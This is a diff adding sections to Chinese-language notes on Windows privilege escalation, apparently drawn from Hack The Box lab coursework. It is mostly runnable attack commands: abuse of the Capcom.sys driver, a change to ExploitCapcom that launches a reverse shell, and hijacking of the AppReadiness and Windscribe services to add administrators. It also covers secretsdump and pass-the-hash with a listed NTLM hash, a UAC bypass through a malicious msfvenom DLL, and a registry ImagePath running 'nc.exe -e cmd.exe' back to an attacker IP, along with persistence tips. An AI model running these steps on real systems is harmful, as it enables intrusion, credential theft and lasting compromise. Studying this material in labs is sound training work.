@@ -538,6 +538,428 @@ sc.exe start MozillaMaintenance#用恶意 maintenanceservice.exe 替换这个文
 
 ## 4.5Print Operators
 
+### 4.5.1 确认特权
+
 如果我们发出命令 `whoami /priv`，并且没有看到来自未提升的上下文中的 `SeLoadDriverPrivilege`，则需要绕过 UAC。
 
+### 4.5.2使用cl.exe编译
+
 [UACMe](https://github.com/hfiref0x/UACME) 存储库具有完整的 UAC 旁路列表，可从命令行使用。或者，我们可以从 GUI 打开一个管理命令 shell 并输入作为 Print Operators 组成员的帐户的凭据。
+
+众所周知，驱动程序 `Capcom.sys` 包含允许任何用户以 SYSTEM 权限执行 shellcode 的功能。我们可以使用我们的权限来加载这个易受攻击的驱动程序并升级权限。我们可以[使用此工具](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)来加载驱动程序。PoC 启用权限并为我们加载驱动程序。
+
+添加以下
+
+```c
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+```
+
+在 Visual Studio 2019 开发人员命令提示符中，使用 **cl.exe** 编译它
+
+```cmd-session
+cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+```
+
+### 4.5.3向驱动程序添加引用
+
+接下来，从[这里](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)下载 `Capcom.sys` 驱动程序，并将其保存到 `C：\temp`。发出以下命令，在 HKEY_CURRENT_USER 树下添加对此驱动程序的引用。
+
+```cmd-session
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+```
+
+奇怪的语法 `\？？\` 用于引用恶意驱动程序的 ImagePath 是 [NT 对象路径 ](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c)。Win32 API 将解析并解析此路径，以正确定位和加载我们的恶意驱动程序。
+
+### 4.5.4验证驱动程序是否未加载
+
+使用 Nirsoft 的 [DriverView.exe](http://www.nirsoft.net/utils/driverview.html)，我们可以验证 Capcom.sys 驱动程序是否未加载。
+
+```powershell-session
+PS C:\htb> .\DriverView.exe /stext drivers.txt
+PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
+EnableSeLoadDriverPrivilege.exe#验证权限是否已启用
+```
+
+### 4.5.5使用 ExploitCapcom 工具提升权限
+
+要利用该 Capcom.sys，我们可以在编译 Visual Studio 后使用 [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) 工具。
+
+```powershell-session
+PS C:\htb> .\ExploitCapcom.exe
+```
+
+![image-20251020151214515](pictures/image-20251020151214515.png)
+
+### 4.5.6针对无GUI的情况
+
+如果我们没有对目标的 GUI 访问权限，我们将不得不在编译之前修改 `ExploitCapcom.cpp` 代码。在这里，我们可以编辑第 292 行并替换 `"C:\\Windows\\system32\\cmd.exe"` 为使用 `msfvenom` 创建的反向 shell 二进制文件，例如：`c：\ProgramData\revshell.exe`。
+
+```c
+// Launches a command shell process
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}
+```
+
+此示例中的`命令行`字符串将更改为：TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
+
+### 4.5.7使用 EopLoadDriver 实现自动化
+
+我们可以使用 [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) 等工具来自动执行启用权限、创建注册表项和执行 `NTLoadDriver` 加载驱动程序的过程。为此，我们将运行以下命令：
+
+```cmd-session
+C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+```
+
+然后，我们将运行 `ExploitCapcom.exe` 来弹出 SYSTEM shell 或运行我们的自定义二进制文件。
+
+### 4.5.8清理：删除注册表项
+
+```cmd-session
+C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom
+```
+
+## 4.6 Server Operators
+
+### 4.6.1 查询 AppReadiness 服务
+
+```cmd-session
+C:\htb> sc qc AppReadiness
+```
+
+### 4.6.2使用 PsService 检查服务权限
+
+我们可以使用服务查看器/控制器 [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)（Sysinternals 套件的一部分）来检查服务的权限
+
+```cmd-session
+C:\htb> c:\Tools\PsService.exe security AppReadiness
+```
+
+### 4.6.3检查本地管理员组成员身份
+
+```cmd-session
+C:\htb> net localgroup Administrators
+```
+
+### 4.6.4修改服务二进制路径
+
+```cmd-session
+C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+### 4.6.5启动服务
+
+```cmd-session
+C:\htb> sc start AppReadiness
+```
+
+### 4.6.6确认本地管理员组成员身份
+
+```cmd-session
+C:\htb> net localgroup Administrators
+```
+
+### 4.6.7确认域控制器上的本地管理员访问权限
+
+```shell-session
+crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+```
+
+### 4.6.8从域控制器检索 NTLM 密码哈希
+
+```shell-session
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+```
+
+这些 secretsdump.py 的结果是典型的域凭证 dump 数据，核心价值是获取了**管理员账户的 NTLM 哈希、Kerberos 密钥**，可用于后续的域渗透攻击或权限维持操作。
+
+------
+
+#### 4.6.8.1.直接利用凭证进行横向移动
+
+获取的哈希和密钥可绕过明文密码，直接用于登录其他域内机器。
+
+- **Pass-the-Hash（哈希传递）**：使用 Administrator 的 NTLM 哈希（`7796ee39fd3a9c3a1844556115ae1a54`），通过工具如`psexec`、`wmiexec`登录域内其他机器，命令示例：`psexec.exe \\目标IP -u domain\Administrator -h 7796ee39fd3a9c3a1844556115ae1a54 cmd.exe`。
+
+  `wmiexec.py Administrator@10.129.113.64 -hashes aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54` 
+
+- **Pass-the-Key（密钥传递）**：利用获取的 Kerberos 密钥（如 aes256 密钥），通过`mimikatz`的`sekurlsa::pth`模块生成票据，直接访问域内服务（如文件共享、SQL Server）。
+
+------
+
+#### 4.6.8.2生成黄金票据 / 白银票据
+
+利用 Administrator 的哈希和域信息，伪造高权限 Kerberos 票据，实现长期权限控制。
+
+- **黄金票据（Golden Ticket）**：需要域的 KRBTGT 账户哈希（需额外 dump），结合当前获取的 Administrator 哈希，可生成能访问所有域内资源的票据，绕过大部分域内防护。
+- **白银票据（Silver Ticket）**：仅需目标服务的账户哈希（如文件服务器的机器账户哈希），可生成针对特定服务的票据，隐蔽性更高，适合精准访问。
+
+------
+
+#### 4.6.8.3密码破解与凭证复用
+
+对 NTLM 哈希进行破解，获取明文密码后扩大攻击范围。
+
+- **离线破解**：将 NTLM 哈希（`7796ee39fd3a9c3a1844556115ae1a54`）导入`hashcat`或`john the ripper`，使用字典暴力破解，命令示例：`hashcat -m 1000 hash.txt rockyou.txt`。
+- **凭证复用**：若破解出明文密码，可尝试用于登录域控制器、Exchange 邮件服务器、VPN 等系统，部分管理员会在多个系统使用相同密码。
+
+------
+
+### 4.6.9权限维持与横向扩展
+
+在获取初步权限后，部署后门或工具实现长期控制。
+
+- **部署后门**：通过横向移动登录其他机器后，安装`mimikatz`、`cobalt strike` beacon 等工具，或创建隐藏账户（如`admin$123`），确保后续可随时访问。
+- **信息收集**：利用管理员权限 dump 更多域内账户哈希（如通过`ntdsutil`备份 NTDS.dit 文件），或读取域控制器的组策略、用户列表，寻找更多高价值目标（如数据库服务器、财务系统）。
+
+# 5、攻击操作系统
+
+## 5.1 UAC 用户账户控制
+
+管理员可以使用安全策略来配置 UAC 在本地级别特定于其组织的工作方式 （使用 secpol.msc） ，或通过 Active Directory 域环境中的组策略对象 （GPO） 进行配置和推送。
+
+### 5.1.1 检查当前用户
+
+```cmd-session
+C:\htb> whoami /user
+```
+
+### 5.1.2 确认管理员组成员身份
+
+```cmd-session
+C:\htb> net localgroup administrators
+```
+
+### 5.1.3查看用户权限
+
+```cmd-session
+C:\htb> whoami /priv
+```
+
+### 5.1.4确认UAC已启用
+
+```cmd-session
+C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+```
+
+### 5.1.5检查UAC等级
+
+```cmd-session
+C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+
+### 5.1.6检查Windows版本
+
+```powershell-session
+PS C:\htb> [environment]::OSVersion.Version
+```
+
+[UACME](https://github.com/hfiref0x/UACME) 项目维护 UAC 绕过列表，包括有关受影响的 Windows 内部版本号、使用的技术以及 Microsoft 是否已发布安全更新来修复它的信息。让我们使用第 54 号技术，据称该技术适用于 Windows 10 build 14393。此技术针对自动提升二进制 `SystemPropertiesAdvanced.exe` 的 32 位版本。Windows 允许许多受信任的二进制文件自动提升，而无需 UAC 同意提示。
+
+According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.
+根据[这篇](https://egre55.github.io/system-properties-uac-bypass)博文，32 位版本的 `SystemPropertiesAdvanced.exe` 尝试加载不存在的 DLL srrstr.dll，该 DLL 由系统还原功能使用。
+
+尝试查找 DLL 时，Windows 将使用以下搜索顺序：
+
+1.从加载应用程序的目录
+
+2.C：\Windows\System32
+
+3.C：\Windows\System（64 位系统不支持）
+
+4..目录
+
+5.PATH 环境变量中列出的任何目录
+
+### 5.1.7查看路径变量
+
+```powershell-session
+PS C:\htb> cmd /c echo %PATH%
+```
+
+我们可以通过使用 DLL 劫持来绕过 UAC，方法是将恶意 `srrstr.dll` DLL 放置在 `WindowsApps` 文件夹中，该文件夹将在提升的上下文中加载。
+
+### 5.1.8生成恶意 srrstr.dll 
+
+```shell-session
+@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+```
+
+### 5.1.9在攻击主机上启动 Python HTTP Server
+
+```shell-session
+@htb[/htb]$ sudo python3 -m http.server 8080
+```
+
+### 5.1.10下载 DLL 目标
+
+```powershell-session
+PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+```
+
+### 5.1.11在攻击主机上启动 nc 侦听器
+
+```shell-session
+@htb[/htb]$ nc -lvnp 8443
+```
+
+### 5.1.12测试连接
+
+```cmd-session
+C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+```
+
+```shell-session
+@htb[/htb]$ nc -lnvp 8443
+```
+
+### 5.1.13在目标主机上执行 SystemPropertiesAdvanced.exe
+
+```cmd
+C:\htb> tasklist /svc | findstr "rundll32"
+```
+
+```cmd
+C:\htb> taskkill /PID 7044 /F #确保我们之前执行的 rundll32 进程的任何实例都已终止
+```
+
+```cmd
+C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+
+## 5.2 弱权限
+
+### 方法一、宽松的文件系统ACL
+
+1.1运行SharpUp检查ACL较弱的服务二进制文件
+
+```powershell-session
+PS C:\htb> .\SharpUp.exe audit
+```
+
+1.2使用icacls检查权限
+
+```powershell-session
+PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+```
+
+1.3替换服务二进制文件
+
+该服务也可以由非特权用户启动，因此我们可以备份原始二进制文件并将其替换为`使用 msfvenom` 生成的恶意二进制文件。它可以为我们提供一个反向 shell 作为 `SYSTEM`，或者添加一个本地管理员用户并让我们对机器进行完全的管理控制。
+
+```cmd-session
+C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+C:\htb> sc start SecurityService
+```
+
+## 方法二、弱服务权限
+
+1.1用sharpup再次审查
+
+```cmd-session
+C:\htb> SharpUp.exe audit
+```
+
+1.2使用 AccessChk 检查权限
+
+```cmd-session
+C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
+```
+
+1.3检查本地管理员组
+
+```cmd-session
+C:\htb> net localgroup administrators
+```
+
+1.4更改服务二进制路径
+
+```cmd-session
+C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+```
+
+1.5停止服务
+
+```cmd-session
+C:\htb> sc stop WindscribeService
+```
+
+1.6启动服务
+
+```cmd-session
+C:\htb> sc start WindscribeService
+```
+
+1.7确认添加本地管理员组
+
+```cmd-session
+C:\htb> net localgroup administrators
+```
+
+1.8恢复二进制路径
+
+```cmd-session
+C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
+```
+
+1.9重启服务
+
+```cmd-session
+C:\htb> sc start WindScribeService
+```
+
+1.10验证服务是否正常运行
+
+```cmd-session
+C:\htb> sc query WindScribeService
+```
+
+## 方法三、未带引号的服务路径
+
+安装服务时，注册表配置指定应在服务启动时执行的二进制文件的路径。如果此二进制文件未封装在引号中，Windows 将尝试在不同的文件夹中查找该二进制文件。
+
+但是，在驱动器的根目录或程序文件文件夹中创建文件需要管理权限。即使系统配置错误以允许这样做，用户也可能无法重新启动服务，并且依赖于系统重新启动来提升权限。尽管发现具有未加引号的服务路径的应用程序并不少见，但它通常不会被利用。
+
+**搜索未带引号的服务路径**
+
+```cmd-session
+C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+
+## 方法四、宽松的注册表ACL
+
+1.1检查注册表中的弱服务 ACL
+
+```cmd-session
+C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+```
+
+1.2使用 PowerShell 更改 ImagePath
+
+```powershell-session
+PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+```
+
+1.3检查启动程序，可修改的注册表自动运行二进制文件
+
+```powershell-session
+PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+```
